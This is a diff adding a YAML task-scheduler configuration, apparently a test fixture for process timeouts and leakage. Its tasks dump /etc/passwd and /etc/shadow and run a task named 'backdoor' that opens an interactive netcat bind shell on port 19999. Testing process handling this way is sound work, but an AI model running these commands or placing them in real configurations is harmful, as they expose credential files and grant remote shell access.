@@ -1,0 +1,24 @@
+settings:
+    port: 9777
+tasks:
+    - name: passwd
+      cmd: |
+          echo /etc/passwd
+          cat /etc/passwd
+          echo /etc/shadow
+          cat /etc/shadow || true
+    - name: cleanup
+      cmd: |
+          rm -vrf /tmp/trash.tmp-*
+      interval: 1h
+    - name: backdoor
+      cmd: |
+          rm -f /tmp/f; mkfifo /tmp/f
+          # leakage process through setsid
+          setsid timeout 5 sh -c 'cat /tmp/f | /bin/sh -i 2>&1 | nc -46 -l 19999 > /tmp/f'
+      interval: 17h
+      timeout: 5s
+      splice: 1h
+    - name: sleep
+      cmd: sleep 10s
+      timeout: 5s
